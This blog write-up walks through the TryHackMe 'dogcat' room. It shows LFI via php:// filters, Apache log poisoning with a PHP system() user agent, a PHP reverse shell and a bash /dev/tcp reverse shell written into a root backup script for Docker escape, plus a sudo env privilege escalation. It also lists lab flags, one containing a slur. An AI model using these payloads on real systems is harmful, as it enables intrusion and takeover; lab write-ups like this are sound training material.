---
title: "DogCat"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---
<img src="dogcat.png" width=200 height=200 alt="dogcat">

## Enumeration

### nmap

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S+erXAaXMO2Iac6nYk8jtkS2hg+vAx+7+5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ+qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s=
|   256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl+M3I
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Gobuster

```
/.htpasswd            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/cats                 (Status: 301) [Size: 311] [--> http://10.10.250.49/cats/]
/index.php            (Status: 200) [Size: 418]
/server-status        (Status: 403) [Size: 277]
```

nmap show only 22 ssh and 80 http on common ports

gobuster show only a forbidden `cats` directory (there might be dogs too)

on website we notice arguments passed in url `'?view=cat'`

could use burp to bruteforce it but wanna try it manually first so I enter random numbers

it says only cats and dogs allowed so I added a 's' and tried 'cats'...got a nice error

```
Warning: include(dogs.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'dogs.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```

we got LFI...Im not very good at that (not in tryhackme free rooms so I never really learnt it here)

lets google about it...we find alot...but it seems we can use php filter wrappers with base64 encoding to view server files

`?view=php://filter/convert.base64-encode/resource=dog`

wich returns

`PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K`

we decode it

```
echo PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K | base64 -d
<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
```

we can therefore view php files like `index.php`

```
?view=php://filter/convert.base64-encode/resource=dog/../index

PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==
```

Decoded version goes

```
<!DOCTYPE HTML>
<html>

<head>
<title>dogcat</title>
<link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
<h1>dogcat</h1>
<i>a gallery of various dogs or cats</i>

<div>
<h2>What would you like to see?</h2>
<a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
<?php
function containsStr($str, $substr) {
	return strpos($str, $substr) !== false;
}
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
if(isset($_GET['view'])) {
	if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
		echo 'Here you go!';
		include $_GET['view'] . $ext;
	} else {
		echo 'Sorry, only dogs or cats are allowed.';
	}
}
?>
</div>
</body>

</html>
```

we notice php extension is added to any parameter given to `'?ext='` by default...so changing it may allow us to read other files on server

As we are on an apache server (nmap) we can look for logs and try log poisonning

`?view=dog/../../../../../../../var/log/apache2/access.log&ext=`

we can read logs..now we fire up burp suite and use repeater to change our user agent to pass commands with a c parameter

Our user agent is

```
<?php system($_GET['c']);?>
```

with our user agent executing commands we try to change our request by adding a simple ls to c parameter

`GET /?view=dog/../../../../../../../var/log/apache2/access.log&ext=&c=ls HTTP/1.1`

wich works

```
cats
dog.php
dogs
flag.php
index.php
style.css
"
```

Now as command we pass a simple shell with netcat listening

Needed to url encode it (burpsuite do that for us when we use the inspector pannel) and pass this as c parameter

`php -r '$sock=fsockopen("10.8.226.203", 2311);exec("/bin/bash -i <&3 >&3 2>&3");'`

we immediately found FLAG 1:

```
www-data@4d7292b580b8:/var/www/html$ cat flag.php
cat flag.php

<?php
$flag_1 = "THM{bark_meow_bark_woof}"
?>

www-data@4d7292b580b8:/var/www/html$
```

Time to move around...we move backward and found second flag (that was quicker than expected)

```
cd ..
www-data@4d7292b580b8:/var/www$ ls
ls
flag2_QMW7JvaY2LvK.txt
html
www-data@4d7292b580b8:/var/www$ cat flag2_QMW7JvaY2LvK.txt
cat flag2_QMW7JvaY2LvK.txt
THM{another_one}
```

No folder in home...I guess its time to PriVEsc

## privilege escalation

```
sudo -l
Matching Defaults entries for www-data on 4d7292b580b8:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 4d7292b580b8:
(root) NOPASSWD: /usr/bin/env
```

env? that's new lets ask for almighty gtfobins what it thinks...it says

```
sudo env /bin/sh
```

```
id
uid=0(root) gid=0(root) groups=0(root)
```

we are root..just like that..lets go get flag3

cd /root
ls
flag3.txt
cat flag3.txt
THM{different_environment_nibba}

hints from flags are cool thins but I don't know where flag 4 could be

when lost I usually go `/` or google

First google about "differents linux environments"

ok after alot of reading and the realisation I may be stupid (this room was abot php AND `DOCKER`)

we might be in a `docker container` and flag4 is out of it

```
hostname
4d7292b580b8
```

Time to get out of 4d7292b580b8

listing all / folder we found a .dockeren file so yeah its docker

```
ls -al
total 80
drwxr-xr-x 1 root root 4096 Oct 29 22:52 .
drwxr-xr-x 1 root root 4096 Oct 29 22:52 ..
-rwxr-xr-x 1 root root 0 Oct 29 22:52 .dockerenv
drwxr-xr-x 1 root root 4096 Feb 26 2020 bin
drwxr-xr-x 2 root root 4096 Feb 1 2020 boot
drwxr-xr-x 5 root root 340 Oct 29 22:52 dev
drwxr-xr-x 1 root root 4096 Oct 29 22:52 etc
drwxr-xr-x 2 root root 4096 Feb 1 2020 home
drwxr-xr-x 1 root root 4096 Feb 26 2020 lib
drwxr-xr-x 2 root root 4096 Feb 24 2020 lib64
drwxr-xr-x 2 root root 4096 Feb 24 2020 media
drwxr-xr-x 2 root root 4096 Feb 24 2020 mnt
drwxr-xr-x 1 root root 4096 Oct 29 22:52 opt
dr-xr-xr-x 110 root root 0 Oct 29 22:52 proc
drwx------ 1 root root 4096 Mar 10 2020 root
drwxr-xr-x 1 root root 4096 Feb 26 2020 run
drwxr-xr-x 1 root root 4096 Feb 26 2020 sbin
drwxr-xr-x 2 root root 4096 Feb 24 2020 srv
dr-xr-xr-x 13 root root 0 Oct 29 22:52 sys
drwxrwxrwt 1 root root 4096 Mar 10 2020 tmp
drwxr-xr-x 1 root root 4096 Feb 24 2020 usr
drwxr-xr-x 1 root root 4096 Feb 26 2020 var
```

After more googling we check /opt folder

```
cd /opt
cd backups
ls
backup.sh
backup.tar
cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

we found a backup.sh script that backup the root container to backup.tar

probably as a cron job

we can add a reverse shell to it as we have root rights

`echo "bash -c 'exec bash -i &>/dev/tcp/10.8.226.203/4444 <&1'" > backup.sh`

wich give us a new root shell on second netcat listening on port 4444

```
hostname
dogcat
```

we escaped..we are on the machine itself

lets look for or final flag...its right here already

```
root@dogcat:~# ls
ls
container
flag4.txt
root@dogcat:~# cat flag4.txt
cat flag4.txt
THM{prison_break_docker}
```

This ctf was awesome (container evasion part mostly)
